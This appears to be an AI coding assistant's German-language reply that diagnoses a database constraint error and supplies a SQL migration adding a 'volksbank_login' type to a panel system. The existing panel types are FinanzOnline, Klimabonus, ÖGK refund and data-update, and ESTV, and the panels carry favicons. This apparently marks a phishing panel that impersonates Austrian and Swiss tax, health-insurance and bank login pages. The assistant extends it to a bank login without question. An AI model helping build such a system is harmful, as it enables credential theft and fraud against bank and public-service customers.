**Ursache:** Die CHECK-Constraints auf `public.panels.type` und `public.panel_type_settings.type` erlauben `volksbank_login` nicht — deshalb wirft Postgres beim Upsert einen Constraint-Fehler, den das UI als „object object" ausgibt.

**Fix (Migration):**
```sql
ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv','volksbank_login'));

ALTER TABLE public.panel_type_settings DROP CONSTRAINT IF EXISTS panel_type_settings_type_check;
ALTER TABLE public.panel_type_settings ADD CONSTRAINT panel_type_settings_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv','volksbank_login'));
```

Danach lassen sich Panels vom Typ „Volksbank" anlegen und ein Favicon dafür speichern.
